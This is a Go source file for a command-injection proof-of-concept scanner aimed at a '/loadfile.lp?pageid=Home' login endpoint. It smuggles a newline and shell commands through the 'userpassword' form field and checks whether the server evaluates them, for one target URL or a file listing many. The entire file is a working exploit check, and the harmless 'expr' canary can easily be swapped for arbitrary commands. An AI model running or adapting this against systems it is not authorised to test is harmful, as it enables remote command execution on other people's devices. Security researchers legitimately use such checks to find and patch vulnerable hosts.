package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

func main() {
	var targetURL string
	var inputFile string

	flag.StringVar(&targetURL, "url", "", "Target URL")
	flag.StringVar(&inputFile, "file", "", "Input file containing URLs")
	flag.Parse()

	if targetURL != "" {
		fmt.Printf("[*] Testing single URL: %s\n", targetURL)
		testURL(targetURL)
	} else if inputFile != "" {
		fmt.Printf("[*] Testing URLs from file: %s\n", inputFile)
		testURLsFromFile(inputFile)
	} else {
		fmt.Println("[-] Please provide either a target URL or an input file")
		return
	}
}

func testURL(urlStr string) {
	rand.Seed(time.Now().UnixNano())
	num := rand.Intn(90001) + 10000

	payload := fmt.Sprintf(`POC%%0Aecho -e "\n";expr %d \* 2;echo -e "\n"%%0A`, num)

	data := fmt.Sprintf("username=sample_username&userpassword=%s&login=Login", payload)

	loadfileURL := urlStr + "/loadfile.lp?pageid=Home"

	resp, err := http.Post(loadfileURL, "application/x-www-form-urlencoded", strings.NewReader(data))
	if err != nil {
		fmt.Println("[-] Request failed:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, fmt.Sprintf("%d", num*2)) {
				printSuccess("[+] Command Injection Vulnerability Detected!")
				fmt.Printf("[*] Payload: %s\n", payload)
				return
			}
		}
	}

	printFailure("[-] Command Injection Vulnerability Not Detected.")
}

func testURLsFromFile(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("[-] Failed to open file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		url := scanner.Text()
		fmt.Println("[*] Testing URL:", url)
		testURL(url)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("[-] Error reading file:", err)
	}
}

// printSuccess prints text in green color with bold style
func printSuccess(text string) {
	color.New(color.FgGreen, color.Bold).Println(text)
}

// printFailure prints text in red color with bold style
func printFailure(text string) {
	color.New(color.FgRed, color.Bold).Println(text)
}
